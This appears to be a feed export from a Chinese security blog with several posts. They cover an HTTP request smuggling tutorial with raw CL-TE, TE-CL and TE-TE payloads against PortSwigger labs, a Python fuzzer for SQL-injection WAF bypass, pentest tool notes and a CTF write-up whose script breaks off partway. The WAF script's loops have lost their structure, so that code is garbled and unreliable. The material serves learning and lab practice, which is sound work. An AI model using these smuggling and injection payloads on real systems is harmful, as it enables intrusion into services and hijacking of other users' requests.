alt="https://vuln.top/2020/06/18/HTTP%20f73fc507cac54ad8a67d9e8bbe5f8f04/Untitled.png"></p><p>一般来说，反向代理服务器与后端的源站服务器之间，会重用TCP链接。这也很容易理解，用户的分布范围是十分广泛，建立连接的时间也是不确定的，这样TCP链接就很难重用，而代理服务器与后端的源站服务器的IP地址是相对固定，不同用户的请求通过代理服务器与源站服务器建立链接，这两者之间的TCP链接进行重用，也就顺理成章了。</p><p>当我们向代理服务器发送一个比较模糊的HTTP请求时，由于两者服务器的实现方式不同，可能代理服务器认为这是一个HTTP请求，然后将其转发给了后端的源站服务器，但源站服务器经过解析处理后，只认为其中的一部分为正常请求，剩下的那一部分，就算是走私的请求，当该部分对正常用户的请求造成了影响之后，就实现了HTTP走私攻击。</p><h2 id="CL不为0的GET请求"><a href="#CL不为0的GET请求" class="headerlink" title="CL不为0的GET请求"></a>CL不为0的GET请求</h2><p>其实在这里，影响到的并不仅仅是GET请求，所有不携带请求体的HTTP请求都有可能受此影响，只因为GET比较典型，我们把它作为一个例子。</p><p>在<code>RFC2616</code>中，没有对GET请求像POST请求那样携带请求体做出规定，在最新的<code>RFC7231</code>的4.3.1节中也仅仅提了一句。</p><p>假设前端代理服务器允许GET请求携带请求体，而后端服务器不允许GET请求携带请求体，它会直接忽略掉GET请求中的Content-Length头，不进行处理。这就有可能导致请求走私。</p><p>比如我们构造请求</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">Content-Length: <span class="number">44</span>\r\n</span><br><span class="line"></span><br><span class="line">GET / secret HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>前端服务器收到该请求，通过读取Content-Length，判断这是一个完整的请求，然后转发给后端服务器，而后端服务器收到后，因为它不对Content-Length进行处理，由于Pipeline的存在，它就认为这是收到了两个请求，分别是</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">第一个</span><br><span class="line">GET / HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line"></span><br><span class="line">第二个</span><br><span class="line">GET / secret HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">Host: example.com\r\n</span><br></pre></td></tr></table></figure><p>这就导致了请求走私。在本文的4.3.1小节有一个类似于这一攻击方式的实例，推荐结合起来看下。</p><h2 id="CL-CL"><a href="#CL-CL" class="headerlink" title="CL-CL"></a>CL-CL</h2><p>在<code>RFC7230</code>的第<code>3.3.3</code>节中的第四条中，规定当服务器收到的请求中包含两个<code>Content-Length</code>，而且两者的值不同时，需要返回400错误。</p><blockquote><p><a href="https://tools.ietf.org/html/rfc7230#section-3.3.3" target="_blank" rel="noopener">https://tools.ietf.org/html/rfc7230#section-3.3.3</a></p></blockquote><p>但是总有服务器不会严格的实现该规范，假设中间的代理服务器和后端的源站服务器在收到类似的请求时，都不会返回400错误，但是中间代理服务器按照第一个<code>Content-Length</code>的值对请求进行处理，而后端源站服务器按照第二个<code>Content-Length</code>的值进行处理。</p><p>此时恶意攻击者可以构造一个特殊的请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">Content-Length: 8\r\n</span><br><span class="line">Content-Length: 7\r\n</span><br><span class="line"></span><br><span class="line">12345\r\n</span><br><span class="line">a</span><br></pre></td></tr></table></figure><p>中间代理服务器获取到的数据包的长度为8，将上述整个数据包原封不动的转发给后端的源站服务器，而后端服务器获取到的数据包长度为7。当读取完前7个字符后，后端服务器认为已经读取完毕，然后生成对应的响应，发送出去。而此时的缓冲区去还剩余一个字母a，对于后端服务器来说，这个a是下一个请求的一部分，但是还没有传输完毕。此时恰巧有一个其他的正常用户对服务器进行了请求，假设请求如图所示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /index.html HTTP/1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br></pre></td></tr></table></figure><p>从前面我们也知道了，代理服务器与源站服务器之间一般会重用TCP连接。</p><p>这时候正常用户的请求就拼接到了字母<code>a</code>的后面，当后端服务器接收完毕后，它实际处理的请求其实是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aGET /index.html HTTP/1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br></pre></td></tr></table></figure><p>这时候用户就会收到一个类似于<code>aGET request method not found</code>的报错。这样就实现了一次HTTP走私攻击，而且还对正常用户的行为造成了影响，而且后续可以扩展成类似于CSRF的攻击方式。</p><p>但是两个<code>Content-Length</code>这种请求包还是太过于理想化了，一般的服务器都不会接受这种存在两个请求头的请求包。但是在<code>RFC2616</code>的第4.4节中，规定:<code>如果收到同时存在Content-Length和Transfer-Encoding这两个请求头的请求包时，在处理的时候必须忽略Content-Length</code>，这其实也就意味着请求包中同时包含这两个请求头并不算违规，服务器也不需要返回<code>400</code>错误。服务器在这里的实现更容易出问题。</p><h2 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE"></a>CL-TE</h2><p>所谓<code>CL-TE</code>，就是当收到存在两个请求头的请求包时，前端代理服务器只处理<code>Content-Length</code>这一请求头，而后端服务器会遵守<code>RFC2616</code>的规定，忽略掉<code>Content-Length</code>，处理<code>Transfer-Encoding</code>这一请求头。</p><p>chunk传输数据格式如下，其中size的值由16进制表示。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[chunk size][\r\n][chunk data][\r\n][chunk size][\r\n][chunk data][\r\n][chunk size = <span class="number">0</span>][\r\n][\r\n]</span><br></pre></td></tr></table></figure><p>Lab 地址：<a href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te</a></p><p>构造数据包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: ace01fcf1fd05faf80c21f8b00ea006b.web-security-academy.net\r\n</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0\r\n</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n</span><br><span class="line">Accept-Language: en-US,en;q=0.5\r\n</span><br><span class="line">Cookie: session=E9m1pnYfbvtMyEnTYSe5eijPDC04EVm3\r\n</span><br><span class="line">Connection: keep-alive\r\n</span><br><span class="line">Content-Length: 6\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">G</span><br></pre></td></tr></table></figure><p>连续发送几次请求就可以获得该响应。</p><p><img src="https://vuln.top/2020/06/18/HTTP%20f73fc507cac54ad8a67d9e8bbe5f8f04/Untitled%201.png" alt="https://vuln.top/2020/06/18/HTTP%20f73fc507cac54ad8a67d9e8bbe5f8f04/Untitled%201.png"></p><p>由于前端服务器处理<code>Content-Length</code>，所以这个请求对于它来说是一个完整的请求，请求体的长度为6，也就是</p><p>0\r\n<br>\r\n<br>G</p><p>当请求包经过代理服务器转发给后端服务器时，后端服务器处理<code>Transfer-Encoding</code>，当它读取到<code>0\r\n\r\n</code>时，认为已经读取到结尾了，但是剩下的字母<code>G</code>就被留在了缓冲区中，等待后续请求的到来。当我们重复发送请求后，发送的请求在后端服务器拼接成了类似下面这种请求。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GPOST / HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">Host: ace01fcf1fd05faf80c21f8b00ea006b.web-security-academy.net\r\n</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>服务器在解析时当然会产生报错了。</p><h1 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE-CL"></a><strong>TE-CL</strong></h1><p>所谓<code>TE-CL</code>，就是当收到存在两个请求头的请求包时，前端代理服务器处理<code>Transfer-Encoding</code>这一请求头，而后端服务器处理<code>Content-Length</code>请求头。</p><p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl</a></p><p>构造数据包</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">Host: acf41f441edb9dc9806dca7b00000035.web-security-academy.net\r\n</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Macintosh; Intel Mac OS X <span class="number">10.14</span>; rv:<span class="number">56.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">56.0</span>\r\n</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,*<span class="comment">/*;q=0.8\r\n</span></span><br><span class="line"><span class="comment">Accept-Language: en-US,en;q=0.5\r\n</span></span><br><span class="line"><span class="comment">Cookie: session=3Eyiu83ZSygjzgAfyGPn8VdGbKw5ifew\r\n</span></span><br><span class="line"><span class="comment">Content-Length: 4\r\n</span></span><br><span class="line"><span class="comment">Transfer-Encoding: chunked\r\n</span></span><br><span class="line"><span class="comment">\r\n</span></span><br><span class="line"><span class="comment">12\r\n</span></span><br><span class="line"><span class="comment">GPOST / HTTP/1.1\r\n</span></span><br><span class="line"><span class="comment">\r\n</span></span><br><span class="line"><span class="comment">0\r\n</span></span><br><span class="line"><span class="comment">\r\n</span></span><br></pre></td></tr></table></figure><p><a href="https://images.seebug.org/content/images/2019/10/10/1570691716000-image-20191009095101287.png-w331s" target="_blank" rel="noopener">https://images.seebug.org/content/images/2019/10/10/1570691716000-image-20191009095101287.png-w331s</a></p><p>由于前端服务器处理<code>Transfer-Encoding</code>，当其读取到<code>0\r\n\r\n</code>时，认为是读取完毕了，此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器，后端服务器处理<code>Content-Length</code>请求头，当它读取完<code>12\r\n</code>之后，就认为这个请求已经结束了，后面的数据就认为是另一个请求了，也就是</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GPOST / HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">\r\n</span><br><span class="line"><span class="number">0</span>\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>成功报错。</p><h1 id="3-5-TE-TE"><a href="#3-5-TE-TE" class="headerlink" title="3.5 TE-TE"></a><strong>3.5 TE-TE</strong></h1><p><code>TE-TE</code>，也很容易理解，当收到存在两个请求头的请求包时，前后端服务器都处理<code>Transfer-Encoding</code>请求头，这确实是实现了RFC的标准。不过前后端服务器毕竟不是同一种，这就有了一种方法，我们可以对发送的请求包中的<code>Transfer-Encoding</code>进行某种混淆操作，从而使其中一个服务器不处理<code>Transfer-Encoding</code>请求头。从某种意义上还是<code>CL-TE</code>或者<code>TE-CL</code>。</p><p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header</a></p><p>构造数据包</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">Host: ac4b1fcb1f596028803b11a2007400e4.web-security-academy.net\r\n</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Macintosh; Intel Mac OS X <span class="number">10.14</span>; rv:<span class="number">56.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">56.0</span>\r\n</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,*<span class="comment">/*;q=0.8\r\n</span></span><br><span class="line"><span class="comment">Accept-Language: en-US,en;q=0.5\r\n</span></span><br><span class="line"><span class="comment">Cookie: session=Mew4QW7BRxkhk0p1Thny2GiXiZwZdMd8\r\n</span></span><br><span class="line"><span class="comment">Content-length: 4\r\n</span></span><br><span class="line"><span class="comment">Transfer-Encoding: chunked\r\n</span></span><br><span class="line"><span class="comment">Transfer-encoding: cow\r\n</span></span><br><span class="line"><span class="comment">\r\n</span></span><br><span class="line"><span class="comment">5c\r\n</span></span><br><span class="line"><span class="comment">GPOST / HTTP/1.1\r\n</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded\r\n</span></span><br><span class="line"><span class="comment">Content-Length: 15\r\n</span></span><br><span class="line"><span class="comment">\r\n</span></span><br><span class="line"><span class="comment">x=1\r\n</span></span><br><span class="line"><span class="comment">0\r\n</span></span><br><span class="line"><span class="comment">\r\n</span></span><br></pre></td></tr></table></figure><p><a href="https://images.seebug.org/content/images/2019/10/10/1570691716000-image-20191009111046828.png-w331s" target="_blank" rel="noopener">https://images.seebug.org/content/images/2019/10/10/1570691716000-image-20191009111046828.png-w331s</a></p><p><img src="https://vuln.top/2020/06/18/HTTP%20f73fc507cac54ad8a67d9e8bbe5f8f04/Untitled%202.png" alt="https://vuln.top/2020/06/18/HTTP%20f73fc507cac54ad8a67d9e8bbe5f8f04/Untitled%202.png"></p><p><a href="https://blog.zeddyu.info/2019/12/05/HTTP-Smuggling/" target="_blank" rel="noopener">https://blog.zeddyu.info/2019/12/05/HTTP-Smuggling/</a></p><p><a href="https://paper.seebug.org/1048/" target="_blank" rel="noopener">https://paper.seebug.org/1048/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;HTTP-走私协议&quot;&gt;&lt;a href=&quot;#HTTP-走私协议&quot; class=&quot;headerlink&quot; title=&quot;HTTP 走私协议&quot;&gt;&lt;/a&gt;HTTP 走私协议&lt;/h1&gt;&lt;h1 id=&quot;什么是HTTP请求走私&quot;&gt;&lt;a href=&quot;#什么是HTTP请求走私&quot; c
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Bypass Waf Script</title>
    <link href="https://vuln.top/2020/06/18/bypass/"/>
    <id>https://vuln.top/2020/06/18/bypass/</id>
    <published>2020-06-18T06:04:16.000Z</published>
    <updated>2020-06-18T06:04:16.500Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">#encoding=utf-8</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line">url = &quot;http://192.168.235.133/2.php?a=1&quot;</span><br><span class="line">Fuzz_a = [&apos;/*!14450&apos;,&apos;*/&apos;,&apos;/**/&apos;,&apos;/&apos;,&apos;-&apos;,&apos;+&apos;]</span><br><span class="line">#Fuzz_a = [&apos;&apos;]</span><br><span class="line">Fuzz_b = [&apos;&apos;]</span><br><span class="line">#Fuzz_c = [&apos;%0a&apos;,&apos;%0b&apos;,&apos;%0c&apos;,&apos;%0d&apos;,&apos;%0e&apos;,&apos;%0f&apos;,&apos;%0h&apos;,&apos;%0i&apos;,&apos;%0j&apos;]</span><br><span class="line">Fuzz_c = []</span><br><span class="line">for line in open(&apos;HexValsAllBytes.txt&apos;,&apos;r&apos;).readlines():</span><br><span class="line">    Fuzz_c.append(line.strip(&apos;\n&apos;))</span><br><span class="line"></span><br><span class="line">FUZZ = Fuzz_a+Fuzz_b+Fuzz_c</span><br><span class="line">#配置fuzz字典</span><br><span class="line">header = &#123;&apos;User-Agent&apos;:&apos;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0&apos;&#125;</span><br><span class="line">#设置请求的headers</span><br><span class="line">for a in FUZZ:</span><br><span class="line">pass</span><br><span class="line">for b in FUZZ:</span><br><span class="line">pass</span><br><span class="line">for c in FUZZ:</span><br><span class="line">for d in FUZZ:</span><br><span class="line">pass</span><br><span class="line">for e in FUZZ:</span><br><span class="line">pass</span><br><span class="line"></span><br><span class="line">PYLOAD = &quot;/*!uNion&quot;+a+b+c+d+e+&quot;seLect*/1,3333&quot;</span><br><span class="line">urlp = url+PYLOAD</span><br><span class="line">#print(urlp)</span><br><span class="line">res = requests.get(urlp,headers=header)</span><br><span class="line">#print(res.text)</span><br><span class="line">#使用for排列组合fuzz字典并请求页面</span><br><span class="line">if &apos;1xiaobai13333&apos; in res.text:  #这个flag需要改，根据你测的正常页面中，有什么字段是必然出现的</span><br><span class="line">print (&quot;[*]URL:&quot;+ urlp +&quot;BYPASS！&quot;)</span><br><span class="line">f=open(&apos;result.txt&apos;,&apos;a&apos;)</span><br><span class="line">f.write(urlp+&quot;\n&quot;)</span><br><span class="line">f.close</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>C/S 渗透测试-1</title>
    <link href="https://vuln.top/2020/06/18/C%20S%201%20d48259125c554eabba032eab732a4008/"/>
    <id>https://vuln.top/2020/06/18/C S 1 d48259125c554eabba032eab732a4008/</id>
    <published>2020-06-17T19:33:50.000Z</published>
    <updated>2020-06-18T04:07:08.470Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C-S-渗透测试-1"><a href="#C-S-渗透测试-1" class="headerlink" title="C/S 渗透测试 1"></a>C/S 渗透测试 1</h1><h2 id="1-注册表内的敏感数据"><a href="#1-注册表内的敏感数据" class="headerlink" title="1.注册表内的敏感数据"></a>1.注册表内的敏感数据</h2><p><a href="https://sourceforge.net/projects/regshot/" target="_blank" rel="noopener">https://sourceforge.net/projects/regshot/</a></p><p><img src="https://vuln.top/2020/06/18/C%20S%201%20d48259125c554eabba032eab732a4008//Untitled.png" alt="https://vuln.top/2020/06/18/C%20S%201%20d48259125c554eabba032eab732a4008//Untitled.png"></p><h2 id="内存中的信息泄漏"><a href="#内存中的信息泄漏" class="headerlink" title="内存中的信息泄漏"></a>内存中的信息泄漏</h2><p><a href="https://processhacker.sourceforge.io/" target="_blank" rel="noopener">https://processhacker.sourceforge.io/</a></p><p><img src="https://vuln.top/2020/06/18/C%20S%201%20d48259125c554eabba032eab732a4008//Untitled%201.png" alt="https://vuln.top/2020/06/18/C%20S%201%20d48259125c554eabba032eab732a4008//Untitled%201.png"></p><p><img src="https://vuln.top/2020/06/18/C%20S%201%20d48259125c554eabba032eab732a4008//Untitled%202.png" alt="https://vuln.top/2020/06/18/C%20S%201%20d48259125c554eabba032eab732a4008//Untitled%202.png"></p><p><img src="https://vuln.top/2020/06/18/C%20S%201%20d48259125c554eabba032eab732a4008//Untitled%203.png" alt="https://vuln.top/2020/06/18/C%20S%201%20d48259125c554eabba032eab732a4008//Untitled%203.png"></p><p><img src="https://vuln.top/2020/06/18/C%20S%201%20d48259125c554eabba032eab732a4008//Untitled%204.png" alt="https://vuln.top/2020/06/18/C%20S%201%20d48259125c554eabba032eab732a4008//Untitled%204.png"></p><p><img src="https://vuln.top/2020/06/18/C%20S%201%20d48259125c554eabba032eab732a4008//Untitled%205.png" alt="https://vuln.top/2020/06/18/C%20S%201%20d48259125c554eabba032eab732a4008//Untitled%205.png"></p><h2 id="拦截TCP流量"><a href="#拦截TCP流量" class="headerlink" title="拦截TCP流量"></a>拦截TCP流量</h2><p><a href="https://sourceforge.net/projects/echomirage.oldbutgold.p/" target="_blank" rel="noopener">https://sourceforge.net/projects/echomirage.oldbutgold.p/</a></p><p>新建一个Rules</p><p><img src="https://vuln.top/2020/06/18/C%20S%201%20d48259125c554eabba032eab732a4008//Untitled%206.png" alt="https://vuln.top/2020/06/18/C%20S%201%20d48259125c554eabba032eab732a4008//Untitled%206.png"></p><p>设置想要注入的程序</p><p><img src="https://vuln.top/2020/06/18/C%20S%201%20d48259125c554eabba032eab732a4008//Untitled%207.png" alt="https://vuln.top/2020/06/18/C%20S%201%20d48259125c554eabba032eab732a4008//Untitled%207.png"></p><p><img src="https://vuln.top/2020/06/18/C%20S%201%20d48259125c554eabba032eab732a4008//Untitled%208.png" alt="https://vuln.top/2020/06/18/C%20S%201%20d48259125c554eabba032eab732a4008//Untitled%208.png"></p><h2 id="反编译-NET"><a href="#反编译-NET" class="headerlink" title="反编译.NET"></a>反编译.NET</h2><p>.Net Reflector</p><p><img src="https://vuln.top/2020/06/18/C%20S%201%20d48259125c554eabba032eab732a4008//Untitled%209.png" alt="https://vuln.top/2020/06/18/C%20S%201%20d48259125c554eabba032eab732a4008//Untitled%209.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;C-S-渗透测试-1&quot;&gt;&lt;a href=&quot;#C-S-渗透测试-1&quot; class=&quot;headerlink&quot; title=&quot;C/S 渗透测试 1&quot;&gt;&lt;/a&gt;C/S 渗透测试 1&lt;/h1&gt;&lt;h2 id=&quot;1-注册表内的敏感数据&quot;&gt;&lt;a href=&quot;#1-注册表内的敏感数
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>豌豆杯入学ctf</title>
    <link href="https://vuln.top/2019/10/16/137/"/>
    <id>https://vuln.top/2019/10/16/137/</id>
    <published>2019-10-16T12:19:46.000Z</published>
    <updated>2021-01-10T08:42:00.960Z</updated>
    
    <content type="html"><![CDATA[<!--markdown-->web题<hr><p>1.题目:小可爱<br>第一步肯定是绕过本地回环地址<br><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110162152/4285938054.png" alt="CC25B038-F2D2-4F85-93F7-F51924B8DAB8.png"><br>一开始想到的是<code>x-forward-for</code>等告诉服务器我的地址但发现没有绕过 看题目题目是说来源地址想到了<code>referer</code>成功绕过<br><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110162315/1177985903.png" alt="BC410D27-3BE1-40E5-ABF5-777F7144F502.png"><br><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/366387116.png" alt="AEA1A04B-27BA-4393-953B-75D948C95027.png"><br>这里没啥思路只能爆破<br><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/2499653827.png" alt="B9E617B3-EF26-477B-B78C-534C490FB3C4.png"><br>密码为orange 访问到另外一个页面 然后登录。 发现是一张迪丽热巴的图片 这个主管很喜欢迪丽热巴啊！！<br><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/1630037561.png" alt="122FC809-D249-4228-9EB5-1E7F101BB7C1.png"><br><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/296032636.png" alt="ADBC80E5-9B6D-4483-B1D4-286FE4B9E3F2.png"><br>将图片下载下来，用<code>binwalk</code>查看下发现有压缩包!<code>foremost</code>下得到压缩包发现有密码<br><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/RujlNg.png" alt="70BBCD6F-2D2E-4D93-8F11-80D576A5CB54.png"><br><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/2411784842.png" alt="DABA844F-3716-4889-96CA-04A7E6137C96.png"><br>这个地方解了很久发现使用Dilraba的md5。。。。<br><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/2601915022.png" alt="F0312D7E-FC35-4DE9-86AF-D5A0F5796C97.png"><br>得到一张图片再一次foremost得到一个压缩包成功拿到flag<br><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/2175607698.png" alt="C065BA1C-B8B1-4157-9E8A-D6BD23ED6440.png"><br>2.题目:单身二十年<br><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/1468141901.png" alt="EA018BA0-F2BB-4204-9784-8E3585F3511B.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">header(&quot;Content-type:text/html;charset=utf-8&quot;); </span><br><span class="line">show_source(__FILE__); </span><br><span class="line">if($_COOKIE[&apos;token&apos;]==&apos;5D41402ABC4B2A76B9719D911017C592&apos;)&#123; </span><br><span class="line">    $file    =    &apos;dump/&apos;.md5(base64_encode(mt_rand(1,100))).&apos;.txt&apos;; </span><br><span class="line">    file_put_contents($file,file_get_contents(&apos;327A6C4304AD5938EAF0EFB6CC3E53DC.php&apos;)); </span><br><span class="line">    sleep(10); </span><br><span class="line">    unlink($file); </span><br><span class="line">&#125;else&#123; </span><br><span class="line">    header(&apos;Location: index.php&apos;); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">setcookie(&quot;token&quot;); </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>看懂源码发现访问页面会睡眠十秒他会把flag写入到一个1到100随机数字经过base64,md5的txt文件里。<br>一种是用burp直接get到这里我就不演示了,我是直接写的python,访问下页面执行脚本就行了。<br><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/3316060136.png" alt="9BB9177B-2227-4784-A0BB-B029ED948AF3.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import hashlib</span><br><span class="line">import requests</span><br><span class="line">for i in range(1,101):</span><br><span class="line">headers = &#123;&apos;Content-type&apos;:&apos;text/html;charset=utf-8&apos;&#125;</span><br><span class="line">encodestr = base64.b64encode(str(i).encode(&apos;utf-8&apos;))</span><br><span class="line">cookies = &#123;&apos;token&apos;:&apos;5D41402ABC4B2A76B9719D911017C592&apos;&#125;</span><br><span class="line">#print(encodestr)</span><br><span class="line">m = hashlib.md5()</span><br><span class="line">m.update(encodestr)</span><br><span class="line">#print(m.hexdigest())</span><br><span class="line">a = m.hexdigest()</span><br><span class="line">url = &apos;http://106.14.145.133:8081/web10/dump/&apos;+a+&apos;.txt&apos;</span><br><span class="line">#print(url)</span><br><span class="line">url_get = requests.get(url,headers=headers,cookies=cookies,timeout=2)</span><br><span class="line">#print(url_get.headers)</span><br><span class="line">#print(url_get.cookies)</span><br><span class="line">if 